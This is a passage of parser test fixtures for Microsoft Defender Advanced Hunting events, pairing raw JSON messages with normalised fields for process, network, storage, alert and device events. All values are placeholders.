\"LogonId\": 123456789, \"InitiatingProcessId\": 456, \"AdditionalFields\": {\"uid\": \"0\", \"gid\": \"0\", \"group\": \"root\", \"audit_user\": null, \"auid\": \"123456789\", \"UpperLayer\": \"False\", \"Memfd\": \"False\", \"DriftAction\": \"n/a\"}, \"Timestamp\": \"2025-10-06T06:24:04.3899689Z\", \"ReportId\": \"22222222-2222-2222-2222-222222222222\"}, \"Tenant\": \"DefaultTenant\"}",
        "event": {
            "category": [
                "process"
            ],
            "dataset": "cloud_process_events",
            "type": [
                "info"
            ]
        },
        "@timestamp": "2025-10-06T06:24:04.389968Z",
        "action": {
            "name": "Publish",
            "properties": {
                "ActionType": "ProcessCreated",
                "AzureResourceId": "/subscriptions/22222222-2222-2222-2222-222222222222/resourceGroups/rg-pf-dmp-stg/providers/Microsoft.ContainerService/managedClusters/CLUSTER",
                "ContainerImageName": ":",
                "ContainerName": "host",
                "LogonId": "123456789"
            },
            "type": "ProcessCreated"
        },
        "file": {
            "directory": "/usr/bin/bash",
            "name": "/usr/bin/bash"
        },
        "microsoft": {
            "defender": {
                "report": {
                    "id": "22222222-2222-2222-2222-222222222222"
                }
            }
        },
        "process": {
            "args": [
                "-m",
                "-t",
                "54",
                "Terminate"
            ],
            "command_line": "/etc/node-problem-detector.d/plugin/check_scheduledevent.sh -t Terminate -m 54",
            "name": "bash",
            "parent": {
                "name": "check_terminate",
                "pid": 456
            },
            "pid": 123,
            "working_directory": "/"
        },
        "related": {
            "user": [
                "root"
            ]
        },
        "user": {
            "name": "root"
        }
    }
    	
	```


=== "test_cloud_storage_aggregate_events.json"

    ```json
	
    {
        "message": "{\"time\": \"2025-10-24T09:33:37.8503491Z\", \"tenantId\": \"11111111-1111-1111-1111-111111111111\", \"operationName\": \"Publish\", \"category\": \"AdvancedHunting-CloudStorageAggregatedEvents\", \"_TimeReceivedBySvc\": \"2025-10-24T09:33:35.0911634Z\", \"properties\": {\"DataAggregationStartTime\": \"2025-10-24T08:00:00Z\", \"DataAggregationEndTime\": \"2025-10-24T09:00:00Z\", \"DataSource\": \"Azure Storage\", \"SubscriptionId\": \"11111111-1111-1111-1111-111111111111\", \"ResourceGroup\": \"my-rsg\", \"StorageAccount\": \"mystorageaccount\", \"StorageContainer\": null, \"StorageFileShare\": null, \"ServiceType\": \"Files.SMB\", \"IPAddress\": \"1.1.1.1\", \"UserAgentHeader\": \"\", \"OperationNamesList\": [\"SessionSetup\"], \"AuthenticationType\": \"Kerberos\", \"AccountObjectId\": null, \"AccountTenantId\": null, \"AccountApplicationId\": null, \"AccountUpn\": null, \"AccountType\": \"\", \"OperationsCount\": 1, \"SuccessfulOperationsCount\": 1, \"FailedOperationsCount\": 0, \"TotalResponseLength\": 0, \"SuccessfulReadOperations\": null, \"DistinctGetOperations\": 0, \"AnonymousSuccessfulOperations\": null, \"HasAnonymousResourceNotFoundFailures\": null, \"Md5Hashes\": [], \"AzureResourceId\": \"/subscriptions/11111111-1111-1111-1111-111111111111/resourceGroups/my-rsg/providers/Microsoft.Storage/storageAccounts/mystorageaccount\", \"Location\": \"centraleurope\", \"ActionType\": \"Data Aggregation\", \"AdditionalFields\": {\"FirstEventTimestamp\": \"2025-10-24T08:49:03.343374Z\", \"LastEventTimestamp\": \"2025-10-24T08:49:03.343374Z\", \"ClientCloudPlatformName\": \"N/A\", \"IsTorExitNode\": false, \"IsKnownSuspiciousIp\": false, \"IsPrivateIp\": true}, \"Timestamp\": \"2025-10-24T09:32:14.353694Z\", \"ReportId\": \"11111111-1111-1111-1111-111111111111\"}, \"Tenant\": \"DefaultTenant\"}",
        "event": {
            "category": [
                "network"
            ],
            "dataset": "cloud_storage_aggregate_events",
            "type": [
                "info"
            ]
        },
        "@timestamp": "2025-10-24T09:32:14.353694Z",
        "action": {
            "name": "Publish",
            "properties": {
                "AuthenticationType": "Kerberos",
                "AzureResourceId": "/subscriptions/11111111-1111-1111-1111-111111111111/resourceGroups/my-rsg/providers/Microsoft.Storage/storageAccounts/mystorageaccount",
                "DataSource": "Azure Storage",
                "DistinctGetOperations": 0,
                "FailedOperationsCount": 0,
                "Location": "centraleurope",
                "OperationNamesList": [
                    "SessionSetup"
                ],
                "OperationsCount": 1,
                "ResourceGroup": "my-rsg",
                "ServiceType": "Files.SMB",
                "StorageAccount": "mystorageaccount",
                "SubscriptionId": "11111111-1111-1111-1111-111111111111",
                "SuccessfulOperationsCount": 1
            },
            "type": "Data Aggregation"
        },
        "microsoft": {
            "defender": {
                "report": {
                    "id": "11111111-1111-1111-1111-111111111111"
                }
            }
        },
        "related": {
            "ip": [
                "1.1.1.1"
            ]
        },
        "source": {
            "address": "1.1.1.1",
            "ip": "1.1.1.1"
        }
    }
    	
	```


=== "test_connection_acknowledged.json"

    ```json
	
    {
        "message": "{\"time\":\"2024-08-30T07:00:12.5431823Z\",\"tenantId\":\"11111111-1111-1111-1111-111111111111\",\"operationName\":\"Publish\",\"category\":\"AdvancedHunting-DeviceNetworkEvents\",\"_TimeReceivedBySvc\":\"2024-08-30T06:57:48.6877713Z\",\"properties\":{\"DeviceName\":\"dks001.example.org\",\"DeviceId\":\"68b329da9893e34099c7d8ad5cb9c940\",\"ReportId\":33227,\"RemoteIP\":\"2.2.2.2\",\"RemotePort\":443,\"LocalIP\":\"1.1.1.1\",\"LocalPort\":56468,\"Protocol\":\"TcpV4\",\"RemoteUrl\":null,\"InitiatingProcessCreationTime\":null,\"InitiatingProcessId\":0,\"InitiatingProcessCommandLine\":null,\"InitiatingProcessParentCreationTime\":null,\"InitiatingProcessParentId\":0,\"InitiatingProcessParentFileName\":null,\"InitiatingProcessSHA1\":null,\"InitiatingProcessMD5\":null,\"InitiatingProcessFolderPath\":null,\"InitiatingProcessAccountName\":null,\"InitiatingProcessAccountDomain\":null,\"InitiatingProcessAccountSid\":null,\"InitiatingProcessFileName\":null,\"InitiatingProcessIntegrityLevel\":null,\"InitiatingProcessTokenElevation\":\"None\",\"AppGuardContainerId\":\"\",\"LocalIPType\":null,\"RemoteIPType\":null,\"ActionType\":\"InboundConnectionAcknowledged\",\"InitiatingProcessSHA256\":null,\"InitiatingProcessAccountUpn\":null,\"InitiatingProcessAccountObjectId\":null,\"AdditionalFields\":\"{\\\"Source Mac\\\":\\\"02:00:00:00:00:01\\\",\\\"Destination Mac\\\":\\\"02:00:00:00:00:02\\\",\\\"Tcp Flags\\\":18,\\\"Packet Size\\\":66}\",\"InitiatingProcessFileSize\":null,\"InitiatingProcessVersionInfoCompanyName\":null,\"InitiatingProcessVersionInfoProductName\":null,\"InitiatingProcessVersionInfoProductVersion\":null,\"InitiatingProcessVersionInfoInternalFileName\":null,\"InitiatingProcessVersionInfoOriginalFileName\":null,\"InitiatingProcessVersionInfoFileDescription\":null,\"InitiatingProcessSessionId\":null,\"IsInitiatingProcessRemoteSession\":false,\"InitiatingProcessRemoteSessionDeviceName\":null,\"InitiatingProcessRemoteSessionIP\":null,\"Timestamp\":\"2024-08-30T07:04:25.6763023Z\",\"MachineGroup\":null},\"Tenant\":\"DefaultTenant\"}",
        "event": {
            "category": [
                "network"
            ],
            "dataset": "device_network_events",
            "type": [
                "info"
            ]
        },
        "@timestamp": "2024-08-30T07:04:25.676302Z",
        "action": {
            "name": "Publish",
            "properties": {
                "IsInitiatingProcessRemoteSession": "false"
            },
            "type": "InboundConnectionAcknowledged"
        },
        "agent": {
            "id": "68b329da9893e34099c7d8ad5cb9c940"
        },
        "destination": {
            "address": "1.1.1.1",
            "ip": "1.1.1.1",
            "mac": "02:00:00:00:00:01",
            "port": 56468
        },
        "host": {
            "id": "68b329da9893e34099c7d8ad5cb9c940",
            "name": "dks001.example.org"
        },
        "microsoft": {
            "defender": {
                "report": {
                    "id": "33227"
                }
            }
        },
        "network": {
            "protocol": "TcpV4"
        },
        "process": {
            "parent": {
                "pid": 0
            },
            "pid": 0
        },
        "related": {
            "ip": [
                "1.1.1.1",
                "2.2.2.2"
            ]
        },
        "source": {
            "address": "2.2.2.2",
            "ip": "2.2.2.2",
            "mac": "02:00:00:00:00:02",
            "port": 443
        }
    }
    	
	```


=== "test_connection_attempt.json"

    ```json
	
    {
        "message": "{\"time\":\"2024-08-07T14:40:43.3217277Z\",\"tenantId\":\"11111111-1111-1111-1111-111111111111\",\"operationName\":\"Publish\",\"category\":\"AdvancedHunting-DeviceNetworkEvents\",\"_TimeReceivedBySvc\":\"2024-08-07T14:39:52.9339374Z\",\"properties\":{\"DeviceName\":\"desktop01.example.com\",\"DeviceId\":\"adc83b19e793491b1c6ea0fd8b46cd9f32e592fc\",\"ReportId\":355896,\"RemoteIP\":\"1.1.1.1\",\"RemotePort\":7680,\"LocalIP\":\"2.2.2.2\",\"LocalPort\":56499,\"Protocol\":\"TcpV4\",\"RemoteUrl\":null,\"InitiatingProcessCreationTime\":null,\"InitiatingProcessId\":0,\"InitiatingProcessCommandLine\":null,\"InitiatingProcessParentCreationTime\":null,\"InitiatingProcessParentId\":0,\"InitiatingProcessParentFileName\":null,\"InitiatingProcessSHA1\":null,\"InitiatingProcessMD5\":null,\"InitiatingProcessFolderPath\":null,\"InitiatingProcessAccountName\":null,\"InitiatingProcessAccountDomain\":null,\"InitiatingProcessAccountSid\":null,\"InitiatingProcessFileName\":null,\"InitiatingProcessIntegrityLevel\":null,\"InitiatingProcessTokenElevation\":\"None\",\"AppGuardContainerId\":\"\",\"LocalIPType\":null,\"RemoteIPType\":null,\"ActionType\":\"ConnectionAttempt\",\"InitiatingProcessSHA256\":null,\"InitiatingProcessAccountUpn\":null,\"InitiatingProcessAccountObjectId\":null,\"AdditionalFields\":\"{\\\"Source Mac\\\":\\\"02:00:00:00:00:01\\\",\\\"Destination Mac\\\":\\\"02:00:00:00:00:02\\\",\\\"Tcp Flags\\\":2,\\\"Packet Size\\\":66}\",\"InitiatingProcessFileSize\":null,\"InitiatingProcessVersionInfoCompanyName\":null,\"InitiatingProcessVersionInfoProductName\":null,\"InitiatingProcessVersionInfoProductVersion\":null,\"InitiatingProcessVersionInfoInternalFileName\":null,\"InitiatingProcessVersionInfoOriginalFileName\":null,\"InitiatingProcessVersionInfoFileDescription\":null,\"InitiatingProcessSessionId\":null,\"IsInitiatingProcessRemoteSession\":false,\"InitiatingProcessRemoteSessionDeviceName\":null,\"InitiatingProcessRemoteSessionIP\":null,\"Timestamp\":\"2024-08-07T14:39:37.2995901Z\",\"MachineGroup\":\"All_Win10_11\"},\"Tenant\":\"DefaultTenant\"}",
        "event": {
            "category": [
                "network"
            ],
            "dataset": "device_network_events",
            "type": [
                "info"
            ]
        },
        "@timestamp": "2024-08-07T14:39:37.299590Z",
        "action": {
            "name": "Publish",
            "properties": {
                "IsInitiatingProcessRemoteSession": "false"
            },
            "type": "ConnectionAttempt"
        },
        "agent": {
            "id": "adc83b19e793491b1c6ea0fd8b46cd9f32e592fc"
        },
        "destination": {
            "address": "1.1.1.1",
            "ip": "1.1.1.1",
            "mac": "02:00:00:00:00:02",
            "port": 7680
        },
        "host": {
            "id": "adc83b19e793491b1c6ea0fd8b46cd9f32e592fc",
            "name": "desktop01.example.com"
        },
        "microsoft": {
            "defender": {
                "report": {
                    "id": "355896"
                }
            }
        },
        "network": {
            "protocol": "TcpV4"
        },
        "process": {
            "parent": {
                "pid": 0
            },
            "pid": 0
        },
        "related": {
            "ip": [
                "1.1.1.1",
                "2.2.2.2"
            ]
        },
        "source": {
            "address": "2.2.2.2",
            "ip": "2.2.2.2",
            "mac": "02:00:00:00:00:01",
            "port": 56499
        }
    }
    	
	```


=== "test_detection_source.json"

    ```json
	
    {
        "message": "{\"time\":\"2022-09-02T22:06:00.6652718Z\",\"tenantId\":\"11111111-1111-1111-1111-111111111111\",\"operationName\":\"Publish\",\"category\":\"AdvancedHunting-AlertInfo\",\"properties\":{\"AlertId\":\"da637977531594995313_968283104\",\"Timestamp\":\"2022-09-02T22:04:16.134644Z\",\"Title\":\"'Lodi' unwanted software was prevented\",\"ServiceSource\":\"Microsoft Defender for Endpoint\",\"Category\":\"DefenseEvasion\",\"Severity\":\"Informational\",\"DetectionSource\":\"Antivirus\",\"MachineGroup\":\"Windows 10 - remediate threats automatically\",\"AttackTechniques\":\"\"}}",
        "event": {
            "category": [
                "threat"
            ],
            "dataset": "alert_info",
            "kind": "alert",
            "type": [
                "info"
            ]
        },
        "@timestamp": "2022-09-02T22:04:16.134644Z",
        "action": {
            "name": "Publish",
            "properties": {
                "ServiceSource": "Microsoft Defender for Endpoint"
            }
        },
        "microsoft": {
            "defender": {
                "alert": {
                    "id": "da637977531594995313_968283104",
                    "severity": "Informational",
                    "title": "'Lodi' unwanted software was prevented"
                },
                "threat": {
                    "category": "DefenseEvasion",
                    "severity": "Informational"
                }
            }
        },
        "service": {
            "name": "Microsoft Defender for Endpoint",
            "type": "Antivirus"
        }
    }
    	
	```


=== "test_device_event.json"

    ```json
	
    {
        "message": "{\"time\":\"2022-09-01T07:28:59.5127177Z\",\"tenantId\":\"11111111-1111-1111-1111-111111111111\",\"operationName\":\"Publish\",\"category\":\"AdvancedHunting-DeviceEvents\",\"properties\":{\"AccountSid\":null,\"AccountDomain\":null,\"AccountName\":null,\"LogonId\":null,\"FileName\":null,\"FolderPath\":null,\"MD5\":null,\"SHA1\":null,\"FileSize\":null,\"SHA256\":null,\"ProcessCreationTime\":null,\"ProcessTokenElevation\":null,\"RemoteUrl\":null,\"RegistryKey\":null,\"RegistryValueName\":null,\"RegistryValueData\":null,\"RemoteDeviceName\":null,\"FileOriginIP\":null,\"FileOriginUrl\":null,\"LocalIP\":\"1.1.1.1\",\"LocalPort\":null,\"RemoteIP\":\"2.2.2.2\",\"RemotePort\":null,\"ProcessId\":null,\"ProcessCommandLine\":null,\"AdditionalFields\":\"{\\\"BaseAddress\\\":2098738167808,\\\"RegionSize\\\":262144,\\\"ProtectionMask\\\":64}\",\"ActionType\":\"NtAllocateVirtualMemoryApiCall\",\"InitiatingProcessVersionInfoCompanyName\":\"Google\",\"InitiatingProcessVersionInfoProductName\":\"Software Reporter Tool\",\"InitiatingProcessVersionInfoProductVersion\":\"102.286.200\",\"InitiatingProcessVersionInfoInternalFileName\":\"software_reporter_tool_exe\",\"InitiatingProcessVersionInfoOriginalFileName\":\"software_reporter_tool.exe\",\"InitiatingProcessVersionInfoFileDescription\":\"Software Reporter Tool\",\"InitiatingProcessFolderPath\":\"c:\\\\users\\\\USER\\\\appdata\\\\local\\\\google\\\\chrome\\\\user data\\\\swreporter\\\\102.286.200\\\\software_reporter_tool.exe\",\"InitiatingProcessFileName\":\"software_reporter_tool.exe\",\"InitiatingProcessFileSize\":14687048,\"InitiatingProcessMD5\":\"68b329da9893e34099c7d8ad5cb9c940\",\"InitiatingProcessSHA256\":\"01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b\",\"InitiatingProcessSHA1\":\"adc83b19e793491b1c6ea0fd8b46cd9f32e592fc\",\"InitiatingProcessLogonId\":121834210,\"InitiatingProcessAccountSid\":\"user1\",\"InitiatingProcessAccountDomain\":\"example.com\",\"InitiatingProcessAccountName\":\"user1\",\"InitiatingProcessAccountUpn\":\"user@example.org\",\"InitiatingProcessAccountObjectId\":\"22222222-2222-2222-2222-222222222222\",\"InitiatingProcessCreationTime\":\"2022-09-01T06:56:23.7887846Z\",\"InitiatingProcessId\":1664,\"InitiatingProcessCommandLine\":\"\\\"software_reporter_tool.exe\\\" --use-crash-handler-with-id=\\\"\\\\\\\\.\\\\pipe\\\\crashpad_11111_XXXXXXXXXXXXXXXX\\\" --sandboxed-process-id=2 --init-done-notifier=804 --sandbox-mojo-pipe-token=********** --mojo-platform-channel-handle=780 --engine=2\",\"InitiatingProcessParentCreationTime\":\"2022-09-01T06:56:23.595229Z\",\"InitiatingProcessParentId\":15532,\"InitiatingProcessParentFileName\":\"software_reporter_tool.exe\",\"DeviceId\":\"adc83b19e793491b1c6ea0fd8b46cd9f32e592fc\",\"AppGuardContainerId\":\"\",\"MachineGroup\":\"UnassignedGroup\",\"Timestamp\":\"2022-09-01T07:09:47.4980566Z\",\"DeviceName\":\"example.com\",\"ReportId\":104061}}",
        "event": {
            "category": [
                "host"
            ],
            "dataset": "device_events",
            "type": [
                "info"
            ]
        },
        "@timestamp": "2022-09-01T07:09:47.498056Z",
        "action": {
            "name": "Publish",
            "properties": {
                "InitiatingProcessAccountObjectId": "22222222-2222-2222-2222-222222222222",
                "InitiatingProcessCommandLine": "\"software_reporter_tool.exe\" --use-crash-handler-with-id=\"\\\\.\\pipe\\crashpad_11111_XXXXXXXXXXXXXXXX\" --sandboxed-process-id=2 --init-done-notifier=804 --sandbox-mojo-pipe-token=********** --mojo-platform-channel-handle=780 --engine=2",
                "InitiatingProcessFileSize": 14687048,
                "InitiatingProcessLogonId": "121834210",
                "InitiatingProcessVersionInfoCompanyName": "Google",
                "InitiatingProcessVersionInfoFileDescription": "Software Reporter Tool",
                "InitiatingProcessVersionInfoInternalFileName": "software_reporter_tool_exe",
                "InitiatingProcessVersionInfoOriginalFileName": "software_reporter_tool.exe",
                "InitiatingProcessVersionInfoProductName": "Software Reporter Tool",
                "InitiatingProcessVersionInfoProductVersion": "102.286.200"
            },
            "type": "NtAllocateVirtualMemoryApiCall"
        },
        "agent": {
            "id": "adc83b19e793491b1c6ea0fd8b46cd9f32e592fc"
        },
        "destination": {
            "address": "2.2.2.2",
            "ip": "2.2.2.2"
        },
        "host": {
            "id": "adc83b19e793491b1c6ea0fd8b46cd9f32e592fc",
            "name": "example.com"
        },
        "microsoft": {
            "defender": {
                "report": {
                    "id": "104061"
                }
            }
        },
        "process": {
            "args": [
                "--engine=2",
                "--init-done-notifier=804",
                "--mojo-platform-channel-handle=780",
                "--sandbox-mojo-pipe-token=**********",
                "--sandboxed-process-id=2",
                "--use-crash-handler-with-id=\"\\\\.\\pipe\\crashpad_11111_XXXXXXXXXXXXXXXX\""
            ],
            "command_line": "\"software_reporter_tool.exe\" --use-crash-handler-with-id=\"\\\\.\\pipe\\crashpad_11111_XXXXXXXXXXXXXXXX\" --sandboxed-process-id=2 --init-done-notifier=804 --sandbox-mojo-pipe-token=********** --mojo-platform-channel-handle=780 --engine=2",
            "executable": "c:\\users\\USER\\appdata\\local\\google\\chrome\\user data\\swreporter\\102.286.200\\software_reporter_tool.exe",
            "hash": {
                "md5": "68b329da9893e34099c7d8ad5cb9c940",
                "sha1": "adc83b19e793491b1c6ea0fd8b46cd9f32e592fc",
                "sha256": "01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b"
            },
            "name": "software_reporter_tool.exe",
            "parent": {
                "name": "software_reporter_tool.exe",
                "pid": 15532,
                "start": "2022-09-01T06:56:23.595229Z"
            },
            "pid": 1664,
            "start": "2022-09-01T06:56:23.788784Z",
            "user": {
                "domain": "example.com",
                "email": "user@example.org",
                "id": "user1",
                "name": "user1"
            },
            "working_directory": "c:\\users\\USER\\appdata\\local\\google\\chrome\\user data\\swreporter\\102.286.200"
        },
        "related": {
            "hash": [
                "01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b",
                "68b329da9893e34099c7d8ad5cb9c940",
                "adc83b19e793491b1c6ea0fd8b46cd9f32e592fc"
            ],
            "ip": [
                "1.1.1.1",
                "2.2.2.2"
            ]
        },
        "source": {
            "address": "1.1.1.1",
            "ip": "1.1.1.1"
        }
    }
    	
	```


=== "test_device_event_sensitive_file_read.json"

    ```json
	
    {
        "message": "{\"time\":\"2024-11-12T10:18:48.4363168Z\",\"tenantId\":\"xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx\",\"operationName\":\"Publish\",\"category\":\"AdvancedHunting-DeviceEvents\",\"_TimeReceivedBySvc\":\"2024-11-12T10:18:28.1484017Z\",\"properties\":{\"DeviceId\":\"abcdef0123456789\",\"DeviceName\":\"example.com\",\"ReportId\":73291,\"InitiatingProcessId\":1328,\"InitiatingProcessCreationTime\":\"2024-11-12T10:17:23.9905327Z\",\"InitiatingProcessCommandLine\":\"\\\"Browser.exe\\\" /Ticket 11111111-1111-1111-1111-111111111111 /ProjectID 123456789 /Network 0 /DBMode 0\",\"InitiatingProcessParentFileName\":\"Windows.exe\",\"InitiatingProcessParentId\":1820,\"InitiatingProcessParentCreationTime\":\"2024-10-14T05:47:54.3243814Z\",\"InitiatingProcessSHA1\":\"adc83b19e793491b1c6ea0fd8b46cd9f32e592fc\",\"InitiatingProcessMD5\":\"68b329da9893e34099c7d8ad5cb9c940\",\"InitiatingProcessFileName\":\"browser.exe\",\"InitiatingProcessFolderPath\":\"c:\\\\program files (x86)\\\\browser.exe\",\"InitiatingProcessAccountName\":\"username\",\"InitiatingProcessAccountDomain\":\"company\",\"SHA1\":null,\"MD5\":null,\"FileName\":\"FileName.mdb\",\"FolderPath\":\"C:\\\\Log\",\"AccountName\":null,\"AccountDomain\":null,\"AdditionalFields\":null,\"InitiatingProcessAccountSid\":\"S-1-2-3\",\"AppGuardContainerId\":\"\",\"InitiatingProcessSHA256\":\"01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b\",\"SHA256\":null,\"RemoteUrl\":null,\"ProcessCreationTime\":null,\"ProcessTokenElevation\":null,\"ActionType\":\"SensitiveFileRead\",\"FileOriginUrl\":null,\"FileOriginIP\":null,\"InitiatingProcessLogonId\":5223047,\"AccountSid\":\"S-1-2-3\",\"RemoteDeviceName\":null,\"RegistryKey\":null,\"RegistryValueName\":null,\"RegistryValueData\":null,\"LogonId\":null,\"LocalIP\":null,\"LocalPort\":null,\"RemoteIP\":null,\"RemotePort\":null,\"ProcessId\":null,\"ProcessCommandLine\":null,\"InitiatingProcessAccountUpn\":\"USERNAME@COMPANY.COM\",\"InitiatingProcessAccountObjectId\":\"22222222-2222-2222-2222-222222222222\",\"FileSize\":286720,\"InitiatingProcessFileSize\":3316224,\"InitiatingProcessVersionInfoCompanyName\":\"Test Corporation\",\"InitiatingProcessVersionInfoProductName\":\"Test Product\",\"InitiatingProcessVersionInfoProductVersion\":\"1, 0, 0, 1\",\"InitiatingProcessVersionInfoInternalFileName\":\"Browser.EXE\",\"InitiatingProcessVersionInfoOriginalFileName\":\"Browser.EXE\",\"InitiatingProcessVersionInfoFileDescription\":\"Browser EXE\",\"InitiatingProcessSessionId\":\"33333333-3333-3333-3333-333333333333\",\"IsInitiatingProcessRemoteSession\":false,\"InitiatingProcessRemoteSessionDeviceName\":null,\"InitiatingProcessRemoteSessionIP\":null,\"CreatedProcessSessionId\":null,\"IsProcessRemoteSession\":false,\"ProcessRemoteSessionDeviceName\":null,\"ProcessRemoteSessionIP\":null,\"Timestamp\":\"2024-11-12T10:17:24.8588296Z\",\"MachineGroup\":\"PC\"},\"Tenant\":\"DefaultTenant\"}",
        "event": {
            "category": [
                "host"
            ],
            "dataset": "device_events",
            "type": [
                "info"
            ]
        },
        "@timestamp": "2024-11-12T10:17:24.858829Z",
        "action": {
            "name": "Publish",
            "properties": {
                "AccountSid": "S-1-2-3",
                "InitiatingProcessAccountObjectId": "22222222-2222-2222-2222-222222222222",
                "InitiatingProcessCommandLine": "\"Browser.exe\" /Ticket 11111111-1111-1111-1111-111111111111 /ProjectID 123456789 /Network 0 /DBMode 0",
                "InitiatingProcessFileSize": 3316224,
                "InitiatingProcessLogonId": "5223047",
                "InitiatingProcessSessionId": "33333333-3333-3333-3333-333333333333",
                "InitiatingProcessVersionInfoCompanyName": "Test Corporation",
                "InitiatingProcessVersionInfoFileDescription": "Browser EXE",
                "InitiatingProcessVersionInfoInternalFileName": "Browser.EXE",
                "InitiatingProcessVersionInfoOriginalFileName": "Browser.EXE",
                "InitiatingProcessVersionInfoProductName": "Test Product",
                "InitiatingProcessVersionInfoProductVersion": "1, 0, 0, 1",
                "IsInitiatingProcessRemoteSession": "false"
            },
            "type": "SensitiveFileRead"
        },
        "agent": {
            "id": "abcdef0123456789"
        },
        "file": {
            "directory": "C:\\Log",
            "name": "FileName.mdb",
            "size": 286720
        },
        "host": {
            "id": "abcdef0123456789",
            "name": "example.com"
        },
        "microsoft": {
            "defender": {
                "report": {
                    "id": "73291"
                }
            }
        },
        "process": {
            "args": [
                "/DBMode",
                "/Network",
                "/ProjectID",
                "/Ticket",
                "0",
                "0",
                "11111111-1111-1111-1111-111111111111",
                "123456789"
            ],
            "command_line": "\"Browser.exe\" /Ticket 11111111-1111-1111-1111-111111111111 /ProjectID 123456789 /Network 0 /DBMode 0",
            "executable": "c:\\program files (x86)\\browser.exe",
            "hash": {
                "md5": "68b329da9893e34099c7d8ad5cb9c940",
                "sha1": "adc83b19e793491b1c6ea0fd8b46cd9f32e592fc",
                "sha256": "01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b"
            },
            "name": "browser.exe",
            "parent": {
                "name": "Windows.exe",
                "pid": 1820,
                "start": "2024-10-14T05:47:54.324381Z"
            },
            "pid": 1328,
            "start": "2024-11-12T10:17:23.990532Z",
            "user": {
                "domain": "company",
                "email": "USERNAME@COMPANY.COM",
                "id": "S-1-2-3",
                "name": "username"
            },
            "working_directory": "c:\\program files (x86)"
        },
        "related": {
            "hash": [
                "01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b",
                "68b329da9893e34099c7d8ad5cb9c940",
                "adc83b19e793491b1c6ea0fd8b46cd9f32e592fc"
            ]
        }
    }
    	
	```


=== "test_device_events_2.json"

    ```json
	
    {
        "message": "{\"time\":\"2024-10-22T15:10:29.9681180Z\",\"tenantId\":\"11111111-1111-1111-1111-111111111111\",\"operationName\":\"Publish\",\"category\":\"AdvancedHunting-DeviceEvents\",\"_TimeReceivedBySvc\":\"2024-10-22T15:09:20.5220737Z\",\"properties\":{\"DeviceId\":\"adc83b19e793491b1c6ea0fd8b46cd9f32e592fc\",\"DeviceName\":\"example.com\",\"ReportId\":65306,\"InitiatingProcessId\":417271,\"InitiatingProcessCreationTime\":\"2024-10-22T15:09:08.62407Z\",\"InitiatingProcessCommandLine\":null,\"InitiatingProcessParentFileName\":null,\"InitiatingProcessParentId\":0,\"InitiatingProcessParentCreationTime\":null,\"InitiatingProcessSHA1\":null,\"InitiatingProcessMD5\":null,\"InitiatingProcessFileName\":null,\"InitiatingProcessFolderPath\":null,\"InitiatingProcessAccountName\":null,\"InitiatingProcessAccountDomain\":null,\"SHA1\":null,\"MD5\":null,\"FileName\":null,\"FolderPath\":null,\"AccountName\":null,\"AccountDomain\":null,\"AdditionalFields\":\"{\\\"ScriptContent\\\":\\\"# sudo python3 open_files.py --ScriptName open_files.py --id log4j_handlersV2 --filter-env LOG4J_FORMAT_MSG_NO_LOOKUPS=true --filter-name \\\\\\\"log4j,LOG4J,spring-core\\\\\\\" --filter-command \\\\\\\"java,javaw\\\\\\\" --manifest-path \\\\\\\"META-INF/maven/org.apache.logging.log4j/log4j-core/pom.properties\\\\\\\" --marker-path /var/opt/microsoft/mdatp/wdavedr/log4jMitigationApplied --collect-dirlist /log4j/core/lookup/JndiLookup.class,log4j-,spring-core-\\\\n# sudo python2 open_files.py --ScriptName open_files.py --id log4j_handlersV2 --filter-env LOG4J_FORMAT_MSG_NO_LOOKUPS=true --filter-name \\\\\\\"log4j,LOG4J,spring-core\\\\\\\" --filter-command \\\\\\\"java,javaw\\\\\\\" --manifest-path \\\\\\\"META-INF/maven/org.apache.logging.log4j/log4j-core/pom.properties\\\\\\\" --marker-path /var/opt/microsoft/mdatp/wdavedr/log4jMitigationApplied --collect-dirlist /log4j/core/lookup/JndiLookup.class,log4j-,spring-core-\\\\n# sudo rm /opt/microsoft/mdatp/resources/cache/log4j_handlersV2.json \\\\n\\\\nfrom genericpath import isdir\\\\nimport os\\\\nimport re\\\\nimport sys\\\\nimport json\\\\nfrom datetime import datetime as dt\\\\nimport zipfile\\\\nimport string\\\\nimport argparse\\\\nimport traceback\\\\nimport functools\\\\nimport itertools\\\\nimport subprocess as sb\\\\n\\\\nMAX_FILE_SIZE = 1024 * 1024  # 1MB\\\\nMANIFEST_OLD_PATH = \\\\\\\"META-INF/MANIFEST.MF\\\\\\\"\\\\n\\\\ndef take(n, l):\\\\n    for i, item in enumerate(l):\\\\n        if i > n:\\\\n            break\\\\n        yield item\\\\n\\\\nclass Jar:\\\\n    def __init__(self, path):\\\\n        self.path = path\\\\n        self._manifest = {}\\\\n        self._dirlist = []\\\\n\\\\n    def _parse_manifest(self, lines):\\\\n        version_indication = \\\\\\\"version=\\\\\\\"\\\\n        version_lines = [line for line in lines if line.startswith(version_indication)]\\\\n\\\\n        if len(version_lines) > 0:\\\\n            version = version_lines[0][len(version_indication):]\\\\n            yield 'Version', version.strip()\\\\n\\\\n        field_names = ['Specification-Version', 'Specification-Title', 'Specification-Vendor', 'Implementation-Version', 'Implementation-Title', 'Implementation-Vendor']\\\\n        for line in lines:\\\\n            if any(line.startswith(field_name) for field_name in field_names):\\\\n                    key, value = line.split(':')\\\\n                    yield key.strip(), value.strip()\\\\n\\\\n    def _open(self):\\\\n        if not zipfile.is_zipfile(self.path):\\\\n            raise ValueError(\\\\\\\"path is not a zip file: {}\\\\\\\".format(self.path))\\\\n        return zipfile.ZipFile(self.path)\\\\n\\\\n    def _read_dirlist(self):\\\\n        with self._open() as zf:\\\\n            filenames = dict(p for p in zf.namelist())\\\\n            return [f for f in filenames if any(r.search(f.lower()) for r in args.dirlist)]\\\\n\\\\n\\\\n\\\\n    def _get_manifest_path(self, zf):\\\\n        for path in [args.manifest_path, MANIFEST_OLD_PATH]:\\\\n            if path in zf.namelist():\\\\n                return path\\\\n\\\\n    def _read_manifest(self, throw_on_error=False):\\\\n        try:\\\\n            with self._open() as zf:\\\\n                manifest_path = self._get_manifest_path(zf)\\\\n                if not manifest_path:\\\\n                    # Not found 